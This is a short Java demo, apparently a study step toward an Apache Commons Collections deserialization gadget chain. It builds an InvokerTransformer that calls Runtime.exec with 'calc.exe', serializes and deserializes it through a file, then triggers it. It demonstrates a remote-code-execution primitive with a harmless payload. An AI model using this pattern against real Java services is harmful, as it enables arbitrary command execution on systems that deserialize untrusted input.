package demo.makeChain;

import org.apache.commons.collections.functors.InvokerTransformer;
import java.io.*;

public class Demo2 {
    public static void main(String[] args) throws Exception{
        Object input = Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null);
        String iMethodName = "exec";
        Class[] iParamTypes = {String.class};
        Object[] iArgs = {"calc.exe"};
        InvokerTransformer invokerTransformer = new InvokerTransformer(iMethodName, iParamTypes, iArgs);
        //序列化
        FileOutputStream file = new FileOutputStream("chenlvtang.bin");
        ObjectOutputStream se = new ObjectOutputStream(file);
        se.writeObject(invokerTransformer);
        se.close();
        //反序列化
        FileInputStream file1 = new FileInputStream("chenlvtang.bin");
        ObjectInputStream unse = new ObjectInputStream(file1);
        InvokerTransformer serverRead =  (InvokerTransformer) unse.readObject();
        unse.close();

        serverRead.transform(input);
    }
}


